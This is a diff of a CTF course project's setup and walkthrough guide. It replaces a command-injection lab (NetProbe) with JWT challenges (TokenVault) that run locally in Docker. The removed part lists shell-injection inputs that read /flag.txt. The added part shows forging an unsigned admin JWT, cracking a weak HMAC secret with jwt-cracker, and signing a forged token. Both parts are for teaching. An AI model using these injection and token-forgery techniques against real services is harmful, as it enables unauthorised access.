@@ -1,201 +1,246 @@
-# NetProbe – How to Run (Complete Guide)
-### CSCI 3540U | Command Injection CTF Project
+# How to Run – TokenVault JWT CTF Challenges
+
+**Complete Step-by-Step Guide (Simple Language)**
+
+This guide tells you everything you need to know to get all three challenge levels running on your computer, and how to exploit Levels 1 and 2.
 
 ---
 
-## Step 0: Install Docker (One-Time Setup)
+## What You Need Before Starting
 
-You need **Docker Desktop** installed. You only do this once.
+You only need one thing installed:
 
-1. Go to: https://www.docker.com/products/docker-desktop/
-2. Download and install Docker Desktop for your OS (Windows/Mac/Linux)
-3. Open Docker Desktop and wait for it to show **"Engine Running"**
+- **Docker Desktop** — Download from https://www.docker.com/products/docker-desktop/
+  - After installing, open it and make sure it's running (you'll see the whale icon in your taskbar)
+  - You don't need to sign in or do anything else in Docker Desktop — just make sure it's open
 
-> ✅ How to verify Docker is working — open a terminal and run:
-> ```
-> docker --version
-> ```
-> You should see something like: `Docker version 24.x.x`
+You do **not** need Node.js, npm, or anything else installed on your computer. Docker handles everything.
 
 ---
 
-## Step 1: Get the Project
+## Step 1 – Open a Terminal
 
-Clone the GitHub repo (or copy the folder). Open a terminal and navigate to the `netprobe` folder:
+On Windows:
+- Press `Win + R`, type `cmd`, and press Enter
+- Or right-click the Start button → "Terminal"
+
+On Mac:
+- Press `Cmd + Space`, type "Terminal", press Enter
+
+---
+
+## Step 2 – Navigate to the Project Folder
+
+In your terminal, type (adjust the path to wherever you saved this project):
 
 ```bash
-cd path/to/netprobe
+cd path/to/jwt-ctf
+```
+
+For example:
+```bash
+cd C:\Users\YourName\Documents\jwt-ctf
 ```
 
 ---
 
-## Step 2: Running a Challenge Level
+## Running Level 1 (No JWT Verification)
 
-Each level is completely independent and runs in its own Docker container.
-
-### ▶ Run Level 1 (Fully Vulnerable)
+Open a terminal and go to the level1 folder:
 
 ```bash
 cd challenges/level1
-docker-compose up --build
 ```
 
-Then open your browser: **http://localhost:5001**
+Build the Docker image (this downloads and installs everything — takes ~1 minute the first time):
+```bash
+docker build -t tokenvault-level1 .
+```
+
+Run the container:
+```bash
+docker run -p 3001:3000 tokenvault-level1
+```
+
+You'll see:
+```
+  ╔══════════════════════════════════════════════╗
+  ║         TokenVault – Level 1                 ║
+  ║   ⚠️  VULNERABLE: No JWT Verification        ║
+  ║   Running on http://localhost:3000           ║
+  ╚══════════════════════════════════════════════╝
+```
+
+Now open your browser and go to: **http://localhost:3001**
+
+**To stop it:** Press `Ctrl + C` in the terminal.
 
 ---
 
-### ▶ Run Level 2 (Weakly Protected)
+## Running Level 2 (Weak Secret Key)
+
+Open a **new** terminal tab/window and go to the level2 folder:
 
 ```bash
 cd challenges/level2
-docker-compose up --build
+docker build -t tokenvault-level2 .
+docker run -p 3002:3000 tokenvault-level2
 ```
 
-Then open your browser: **http://localhost:5002**
+Open your browser and go to: **http://localhost:3002**
 
 ---
 
-### ▶ Run Level 3 (Fully Secure)
+## Running Level 3 (Fully Secure)
+
+Open a **new** terminal tab/window and go to the level3 folder:
 
 ```bash
 cd challenges/level3
-docker-compose up --build
+docker build -t tokenvault-level3 .
+docker run -p 3003:3000 tokenvault-level3
 ```
 
-Then open your browser: **http://localhost:5003**
+Open your browser and go to: **http://localhost:3003**
 
 ---
 
-## Step 3: Stopping a Level
+## All Three Levels at the Same Time
 
-Press `Ctrl + C` in the terminal to stop the server, then run:
+You can run all three simultaneously in separate terminal windows:
+
+| Level | Terminal | URL |
+|-------|----------|-----|
+| Level 1 | `cd challenges/level1 && docker run -p 3001:3000 tokenvault-level1` | http://localhost:3001 |
+| Level 2 | `cd challenges/level2 && docker run -p 3002:3000 tokenvault-level2` | http://localhost:3002 |
+| Level 3 | `cd challenges/level3 && docker run -p 3003:3000 tokenvault-level3` | http://localhost:3003 |
+
+---
+
+## How to Exploit Level 1 (Step by Step)
+
+**Vulnerability: The server never checks the JWT signature**
+
+1. Open **http://localhost:3001** in your browser
+
+2. Log in with:
+   - Username: `alice`
+   - Password: `password123`
+
+3. You'll see your JWT token appear on screen. Copy the middle part (the **Payload** — highlighted in green)
+
+4. Decode it using Base64. You can do this in your browser console (press F12):
+   ```javascript
+   atob("paste-the-green-middle-part-here")
+   ```
+   You'll see: `{"username":"alice","role":"user","iat":...,"exp":...}`
+
+5. Now change `"role":"user"` to `"role":"admin"` in that JSON
+
+6. Re-encode your new payload:
+   ```javascript
+   btoa('{"username":"alice","role":"admin","iat":1712000000,"exp":9999999999}')
+   ```
+   Fix any `=` padding if needed (remove trailing `=` signs from the result)
+
+7. Build your new token: `ORIGINAL_HEADER.YOUR_NEW_PAYLOAD.anything`
+   ```
+   eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.YOUR_NEW_PAYLOAD_HERE.FAKESIG
+   ```
+
+8. Paste this into the **"Custom Token"** box on the page
+
+9. Click **"Admin Panel (custom token)"**
+
+10. You get the flag: `CTF{jwt_n0_v3r1fy_4lw4ys_trust_n3v3r}` 🎉
+
+---
+
+## How to Exploit Level 2 (Step by Step)
+
+**Vulnerability: JWT is verified, but the secret key is "secret" (easily cracked)**
+
+**Part A – Get a token:**
+
+1. Open **http://localhost:3002**, log in as `alice` / `password123`
+
+2. Copy the full token from the display
+
+**Part B – Crack the secret:**
+
+You need Node.js for this part. Check if you have it:
+```bash
+node --version
+```
+
+If not installed, download from https://nodejs.org/ (LTS version)
+
+Install jwt-cracker:
+```bash
+npm install -g jwt-cracker
+```
+
+Run the cracker (paste your token):
+```bash
+jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.YOURTOKEN..." --alphabet "abcdefghijklmnopqrstuvwxyz"
+```
+
+Output:
+```
+[+] SECRET FOUND: secret
+```
+
+**Part C – Forge an admin token:**
 
 ```bash
-docker-compose down
+node -e "const jwt=require('jsonwebtoken'); console.log(jwt.sign({username:'hacker',role:'admin'},'secret',{algorithm:'HS256'}))"
 ```
 
----
+Note: If `jsonwebtoken` isn't installed globally, cd into any level folder and run the command from there (it's in the local `node_modules` after building).
 
-## Can I Run All 3 Levels at Once?
+**Part D – Use the forged token:**
 
-**Yes!** Since they run on different ports (5001, 5002, 5003), you can open 3 separate terminals and run each one. They won't conflict.
-
----
-
-## What the App Does
-
-The app is a **DNS Lookup Tool** — you type in a domain like `google.com` and it runs `nslookup` on the server, returning DNS information.
-
-Each level has the **same app** but with different security:
-
-| Level | URL | Security | Exploitable? |
-|-------|-----|----------|-------------|
-| 🔴 Level 1 | http://localhost:5001 | None | ✅ Yes (trivially) |
-| 🟡 Level 2 | http://localhost:5002 | Weak blacklist | ✅ Yes (bypass filter) |
-| 🟢 Level 3 | http://localhost:5003 | Whitelist + safe exec | ❌ No |
-
----
-
-## How to Attack (For CTF Players)
-
-The goal is to read `/flag.txt` on the server.
-
-### Level 1 – Try this in the input box:
-```
-google.com; cat /flag.txt
-```
-
-### Level 2 – The semicolon is blocked. Try:
-```
-google.com | cat /flag.txt
-```
-or
-```
-google.com && cat /flag.txt
-```
-
-### Level 3 – This is fully secure. No injection is possible.
+1. Copy the output token
+2. Go to **http://localhost:3002**
+3. Log in as alice first so the interface shows
+4. Paste your forged token into the **"Forged Admin Token"** box
+5. Click **"Admin Panel (forged token)"**
+6. You get the flag: `CTF{w34k_s3cr3t_1s_n0_s3cr3t_4t_4ll}` 🎉
 
 ---
 
 ## Troubleshooting
 
-### "Port already in use" error
-Another app is using that port. Either:
-- Stop the other app, OR
-- Change the port in `docker-compose.yml` (e.g., `"5011:5000"`)
+**"docker: command not found"**  
+→ Docker Desktop is not installed or not running. Install it from https://www.docker.com
 
-### "docker: command not found"
-Docker is not installed or not in your PATH. Install Docker Desktop and restart your terminal.
-
-### "Permission denied" on Linux/Mac
-Run with `sudo`:
+**"Port already in use"**  
+→ You already have something running on that port. Either stop the other container, or change the port:
 ```bash
-sudo docker-compose up --build
+docker run -p 4001:3000 tokenvault-level1   # Use port 4001 instead
+```
+Then visit http://localhost:4001
+
+**"npm: command not found" when trying jwt-cracker**  
+→ Node.js is not installed. Download from https://nodejs.org
+
+**The page shows "Cannot GET /"**  
+→ Make sure you ran `docker build` before `docker run`. Try rebuilding:
+```bash
+docker build --no-cache -t tokenvault-level1 .
+docker run -p 3001:3000 tokenvault-level1
 ```
 
-### The page won't load after running docker-compose
-Wait 5–10 seconds after the container starts before opening the browser. The Flask server needs a moment to initialize.
-
-### nslookup returns no results
-This is expected in some network environments (e.g., university VPN). The command injection still works — just test with `whoami` or `id` first.
+**Container keeps stopping immediately**  
+→ Check for errors by running without the `-d` flag (which you aren't using anyway). Read the output in the terminal for error messages.
 
 ---
 
-## Tech Stack Summary
+## Stopping / Cleaning Up
 
-| Component | Technology |
-|-----------|-----------|
-| Web framework | Python Flask 3.0 |
-| Templating | Jinja2 (built into Flask) |
-| System command | `nslookup` via `os.popen()` / `subprocess.run()` |
-| Containerization | Docker + Docker Compose |
-| Base image | `python:3.11-slim` (Debian) |
+To stop a running container: press `Ctrl + C` in the terminal where it's running.
 
----
-
-## Project Folder Structure
-
-```
-netprobe/
-├── HOW_TO_RUN.md          ← You are here
-├── README.md              ← Short overview
-├── .gitignore
-│
-├── challenges/
-│   ├── level1/
-│   │   ├── app.py         ← Vulnerable Flask app
-│   │   ├── templates/
-│   │   │   └── index.html ← Web UI (red badge)
-│   │   ├── Dockerfile
-│   │   ├── docker-compose.yml
-│   │   ├── HOW_TO_RUN.md
-│   │   └── requirements.txt
-│   │
-│   ├── level2/
-│   │   ├── app.py         ← Weakly protected Flask app
-│   │   ├── templates/
-│   │   │   └── index.html ← Web UI (amber badge)
-│   │   ├── Dockerfile
-│   │   ├── docker-compose.yml
-│   │   ├── HOW_TO_RUN.md
-│   │   └── requirements.txt
-│   │
-│   └── level3/
-│       ├── app.py         ← Secure Flask app
-│       ├── templates/
-│       │   └── index.html ← Web UI (green badge)
-│       ├── Dockerfile
-│       ├── docker-compose.yml
-│       ├── HOW_TO_RUN.md
-│       └── requirements.txt
-│
-├── writeups/
-│   ├── level1/
-│   │   └── writeup.md
-│   └── level2/
-│       └── writeup.md
-│
-└── presentation/
-    └── PRESENTATION.md
+To remove all built images after you're done:
+```bash
+docker rmi tokenvault-level1 tokenvault-level2 tokenvault-level3
 ```
